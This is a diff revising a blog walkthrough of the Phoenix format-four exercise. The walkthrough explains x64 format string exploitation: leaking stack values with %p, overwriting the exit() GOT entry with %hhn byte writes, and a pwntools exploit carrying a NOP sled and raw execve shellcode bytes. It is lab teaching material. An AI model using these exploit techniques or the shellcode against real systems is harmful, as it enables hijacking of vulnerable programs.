@@ -5,7 +5,7 @@ date: 2026-07-09
 tags: [Exploitation, Format Strings]
 ---
 
-The Phoenix series by [Exploit Education](https://exploit.education) is an excellent introduction to memory corruption. In this article, we'll be using the **format-four** exercise to explore format string vulnerabilities. Again, I do these exercises in x64 architecture so they will vary from the standard x86 solutions that are for the 
+The Phoenix series by [Exploit Education](https://exploit.education) is an excellent introduction to memory corruption. In this article, we'll be using the **format-four** exercise to explore format string vulnerabilities. Again, I do these exercises in x64 architecture so they will vary from the standard x86 solutions.
 
 ## **Introduction**
 
@@ -49,13 +49,13 @@ When an attacker controls the actual format string of a format string function, 
 
 ## **Differentiation between normal overflows**
 
-While a normal buffer overflow and a format string attack both can arbitrally overwrite memory but they accomplish the goal in seperate ways. A normal buffer overflow works by exceeding the allocated buffer capacity and physically overwriting the memory address while a format string attack leverages built-in function logic to directly overwrite the memory address.
+While a normal buffer overflow and a format string attack both can arbitrarily overwrite memory, they accomplish the goal in separate ways. A normal buffer overflow works by exceeding the allocated buffer capacity and physically overwriting the memory address while a format string attack leverages built-in function logic to directly overwrite the memory address.
 
 | Buffer Overflow | Format String Attack |
 | --- | --- |
-Exceeds the allocated buffer | Directly writes/reads to/from address
+| Exceeds the allocated buffer | Directly writes/reads to/from address |
 
-Because format strings allow direct overwriting of memory addresses they already have a leg up on normal buffer overflows. However, format strings also have the advantage of having the ability to directly read arbitrary memory addresses which means format strings can be used to leak information as well.
+Format string attacks also have the advantage of having the ability to directly read arbitrary memory addresses which means format strings can be used to leak information as well.
 
 ## **Introducing the challenge**
 
@@ -112,11 +112,7 @@ Our goal is to redirect the execution into the congratulations, I will show a so
 
 ## **What is the Global Offset Table**
 
-The global offset table, usually referred to as the GOT in short, is a section of an ELF binary that stores absolute memory addresses of external functions and data from libraries. The Global Offset Table itself is a target for exploitation as the Global Offset Table redirects execution and when the attacker controls the Global Offset Table, they therefore control execution flow via the Procedural Linkage Table which is the component which actually controls where the code jumps.
-
-```
-[ Global Offset Table ] <===> [ Procedural Linkage Table ] <===> [ Binary ]
-```
+The global offset table, usually referred to as the GOT in short, is a section of an ELF binary that stores absolute memory addresses of external functions and data from libraries. The Global Offset Table itself is a target for exploitation as the Procedural Linkage Table redirects execution through it and when the attacker controls the addresses in the Global Offset Table, they therefore control execution flow via the Procedural Linkage Table. It's kind of like having control of the ball that the dog will chase. 
 
 ## **Finding the `exit()` address with `objdump`**
 
@@ -172,9 +168,9 @@ Using an inline `Python` script for a simple payload we can use to determine the
 
 ```
 ┌──(kali㉿kali)-[~]
-└─$ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAA' + b'\n%p'*20 + b'\n')" | ./format-four
+└─$ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAA' + b'\n%p'*20 + b'\n')" | ./format-four          
 Welcome to Format Four, brought to you by https://exploit.education
-AAAAAAAAA
+AAAAAAAA
 0x7fffffffcd70
 (nil)
 0x388
@@ -187,17 +183,17 @@ AAAAAAAAA
 0x7fffffffde88
 0x1001e2db8
 0x4141414141414141
-0xa70250a70250a41
-0x70250a70250a7025
 0x250a70250a70250a
 0xa70250a70250a70
 0x70250a70250a7025
 0x250a70250a70250a
 0xa70250a70250a70
-0xa70250a7025
+0x70250a70250a7025
+0x250a70250a70250a
+0xa70250a70
 ```
 
-Our A's appear in the 12th slot of the scripts output. We can verify that the input is stored in adjacent memory by expanding the payload
+Our A's appear in the 12th slot of the script's output. We can verify that the input is stored in adjacent memory by expanding the payload
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -231,7 +227,7 @@ As seen by the output of the updated script we have confirmed that the input ove
 
 ## **Shifting via block size**
 
-In order to overwrite the memory we'll need to overwrite the three lowest bytes (all those 0's in `0x0000000000404018` and `0x000000000040117d` don't really matter, just `0x404018` and `0x40117d`). This means we'll need three blocks. Given that we'll likely need to pad by two digits that gives us the section `%NNc` where N is an integer and we need to write those digits so that gives us the section `%NN$hhn` where N is an integer. These two sections will be joined together into `%NNc%NN$hnn` to form a block which has a total length of 11 bytes. We need three of these blocks to overwrite the three bytes meaning we'll have a total length of 33 bytes. 
+In order to overwrite the memory we'll need to overwrite the three lowest bytes (all those 0's in `0x0000000000404018` and `0x000000000040117d` don't really matter, just `0x404018` and `0x40117d`). This means we'll need three blocks. Given that we'll likely need to pad by two digits that gives us the section `%NNc` where N is an integer and we need to write those digits so that gives us the section `%NN$hhn` where N is an integer. These two sections will be joined together into `%NNc%NN$hhn` to form a block which has a total length of 11 bytes. We need three of these blocks to overwrite the three bytes meaning we'll have a total length of 33 bytes. 
 
 These blocks must be 8-byte aligned so we'll need to pad them to reach a 40-byte long format block. This format block can be broken up into five quad-words which will be stored by the registers.
 
@@ -269,7 +265,7 @@ buf += p64(0x40401a)   # arg 18 -> byte 0x40
 buf += p64(0x404018)   # arg 19 -> byte 0x7d
 buf += b"\n"
 
-result = run(["./format-four"], input=buff, capture_output=True)
+result = run(["./format-four"], input=buf)
 ```
 
 ### **The first section handles imports and setup**
@@ -298,11 +294,11 @@ fmt  = fmt.ljust(40, b'A')   # pad to 5 qwords (8-byte boundary)
 
 We need to write the values `0x11`, `0x40`, and `0x7d` into registers in order to use them to write the value `0x000000000040117d` later. The reason we do 17 or `0x11` first is because the `printf()` counter only goes up so we need to write in ascending order.
 
-| Padding | Write | Value
+| Padding | Write | Value |
 | --- | --- | --- |
-%17c = 17 padding bytes | %17$hhn = write count to 17 | count = 17 (`0x11`)
-%47c = 47 padding bytes | %18$hhn = write count to 18 | count = 64 (`0x40`)
-%61c = 61 padding bytes | %19$hhn = write count to 19 | count = 125 (`0x7d`)
+| %17c = 17 padding bytes | %17$hhn = write count to 17 | count = 17 (`0x11`) |
+| %47c = 47 padding bytes | %18$hhn = write count to 18 | count = 64 (`0x40`) |
+| %61c = 61 padding bytes | %19$hhn = write count to 19 | count = 125 (`0x7d`) |
 
 In more specific terms, the operation we perform with each of these format strings are as follows: **1)** Advance the counter to 17 then write the low-byte of the counter (`0x11`) into the address held by argument 17. **2)** Advance the counter by 47 to reach 64 then write the low-byte of the counter (`0x40`) into the address held by argument 18. **3)** Advance the counter by 61 to reach 125 then write the low-byte of the counter (`0x7d`) into the address held by argument 19.
 
@@ -318,9 +314,9 @@ buf += p64(0x404018)   # arg 19 -> byte 0x7d
 We know that the `exit()` address starts at `0x0000000000404018` so we can assemble the payload after the constructed format string accordingly **(remember that we must follow little-endian ordering)**. 
 
 ```
-arg 17 (0x11) <--- 0x11 is written 2nd (0x404018 + 1)
-arg 18 (0x40) <--- 0x40 is written 3rd (0x404018 + 2)
-arg 19 (0x7d) <--- 0x7d is written 1st (0x404018 + 0)
+arg 17 (0x11) <--- 0x11 is written in 2nd position (0x404018 + 1)
+arg 18 (0x40) <--- 0x40 is written in 3rd position (0x404018 + 2)
+arg 19 (0x7d) <--- 0x7d is written in 1st position (0x404018 + 0)
 
 \x7d\x11\x40
 ^ Little Endian
@@ -332,7 +328,7 @@ arg 19 (0x7d) <--- 0x7d is written 1st (0x404018 + 0)
 ### **The fifth section spawns the process and feeds the payload to the binary**
 
 ```python
-result = run(["./format-four"], input=buff, capture_output=True)
+result = run(["./format-four"], input=buf)
 ```
 
 ## **Expected Output**
@@ -397,11 +393,13 @@ $1 = 0x7fffffffdd00
 (gdb) 
 ```
 
+You may be wondering why I used `set exec-wrapper env -i`, this is because we must strip the environment in both the reconnaissance and the payload in order to ensure the most accurate results. In addition, `GDB` uses the full path so when we use the binary in our exploit we should call the full path too. 
+
 ## **Approximating payload size**
 
 We want to write a stack address which means that instead of writing three bytes like in the previous example we'll need to write six bytes instead which naturally makes our payload larger. Right now, we don't know the exact address but we know it will resemble `0x7fffffffNNNN` where N is a hexadecimal byte.
 
-Decomposing this unknown sequence of bytes in order to understand the grouping, in order to make this grouping make sense we'll assume that `NN` are two seperate values less than `7f`. We'll place `NN` and `NN` as the first two bytes as we don't know these values for sure yet. The next byte in this framing will be `7f` and the final bytes will be `ff`, `ff`, and `ff`. An important thing to note about this construction is that `ff` appears three times which means there will be two blocks that don't increment the counter at all, based on information from the first example we can assume that these blocks without a counter increment will look like `%NN$hhn` where N is an integer. Therefore, we can determine the length of these format blocks with a decent amount of certainty to be seven bytes in length.
+Decomposing this unknown sequence of bytes in order to understand the grouping, in order to make this grouping make sense we'll assume that `NN` are two separate values less than `7f`. We'll place `NN` and `NN` as the first two bytes as we don't know these values for sure yet. The next byte in this framing will be `7f` and the final bytes will be `ff`, `ff`, and `ff`. An important thing to note about this construction is that `ff` appears three times which means there will be two blocks that don't increment the counter at all, based on information from the first example we can assume that these blocks without a counter increment will look like `%NN$hhn` where N is an integer. Therefore, we can determine the length of these format blocks with a decent amount of certainty to be seven bytes in length.
 
 ```
 [NN]~~~~~[NN]~~~~~[7f]~~~~~[ff]
@@ -411,9 +409,9 @@ Decomposing this unknown sequence of bytes in order to understand the grouping, 
 
 I hope this diagram offers more insight into understanding the structure, the lowest byte must traverse **x** bytes to get to the second lowest byte and **y** bytes to get to the third lowest byte and **z** bytes to get to the `ff` byte structure but once it reaches the `ff` structure we can be certain of the length it must travel to get to the next bytes because the length it must travel is zero.
 
-In other words, we know that we will perform four full writes in the general format of `%NNc%NN$hhn` where N is an integer and two zero-gap writes `%NN$hnn` where N is an integer and the length is very likely to be seven given previous knowledge of the binary.
+In other words, we know that we will perform four full writes in the general format of `%NNc%NN$hhn` where N is an integer and two zero-gap writes `%NN$hhn` where N is an integer and the length is very likely to be seven given previous knowledge of the binary.
 
-If we then, knowing that the other block which contain some form of `%NNc%NN$hnn`, use the previous example as a reference (11 bytes per full write block) we can infer that the total length may be something like 4(11) + 2(7) or 58. 
+If we then, knowing that the other block which contain some form of `%NNc%NN$hhn`, use the previous example as a reference (11 bytes per full write block) we can infer that the total length may be something like 4(11) + 2(7) or 58. 
 
 58 is not divisible by eight so we'll need to pad to the next number divisible by 8 which is 64.
 
@@ -421,9 +419,9 @@ This means that there will be eight quad words and therefore we need to offset t
 
 ```
 ┌──(kali㉿kali)-[~]
-└─$ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAA' + b'\n%p'*20 + b'\n')" | ./format-four
+└─$ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAA' + b'\n%p'*20 + b'\n')" | ./format-four          
 Welcome to Format Four, brought to you by https://exploit.education
-AAAAAAAAA
+AAAAAAAA
 0x7fffffffcd70
 (nil)
 0x388
@@ -436,14 +434,14 @@ AAAAAAAAA
 0x7fffffffde88
 0x1001e2db8
 0x4141414141414141
-0xa70250a70250a41
-0x70250a70250a7025
 0x250a70250a70250a
 0xa70250a70250a70
 0x70250a70250a7025
 0x250a70250a70250a
 0xa70250a70250a70
-0xa70250a7025
+0x70250a70250a7025
+0x250a70250a70250a
+0xa70250a70
 ``` 
 
 ## **Using `pwntools` to write an exploit**
@@ -499,7 +497,7 @@ ARG0 = 20
 shell_addr = BUF + FMT_LEN + 48 + SLED // 2
 ```
 
-The first variable is the address of the buffer variable, the second variable is the address of the `exit()` function as defined by the Global Offset Table, the third variable is the length of the format string payload, the fourth variable is the length of the `NOP` sled we'll implement to enhance reliability of our exploit, the fifth variable is the starting argument. The final variable in this section is the "address of the `shellcode`", in reality we add the buffer address to the length of the format string and then add that number to 48, which is the length six quad word pointers take up (6 * 8 = 48), then finally we add have of the sled to our "address of the shellcode" so our "address to the shellcode" is actually in the middle of a `NOP` sled to improve reliability
+The first variable is the address of the buffer variable, the second variable is the address of the `exit()` function as defined by the Global Offset Table, the third variable is the length of the format string payload, the fourth variable is the length of the `NOP` sled we'll implement to enhance reliability of our exploit, the fifth variable is the starting argument. The final variable in this section is the "address of the `shellcode`", in reality we add the buffer address to the length of the format string and then add that number to 48, which is the length six quad word pointers take up (6 * 8 = 48), then finally we add half of the sled to our "address of the shellcode" so our "address to the shellcode" is actually in the middle of a `NOP` sled to improve reliability
 
 ### **The third section splits the target address into byte-writes**
 
@@ -585,7 +583,7 @@ buf += b"\x48\x81\xec\x00\x01\x00\x00"
 buf += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 ```
 
-The first line left justifies the format string payload by padding to the format length requirement we defined, the next line is simply adding a `NOP` sled to the payload. The line after that instructions to prepare the stack for the `shellcode` and the final line is the actual `shellcode`.
+The first line left justifies the format string payload by padding to the format length requirement we defined, the next line is simply adding a `NOP` sled to the payload. The line after that contains instructions in byte form to prepare the stack for the `shellcode` and the final line is the actual `shellcode`.
 
 #### **Part 1 - stack fixup**
  
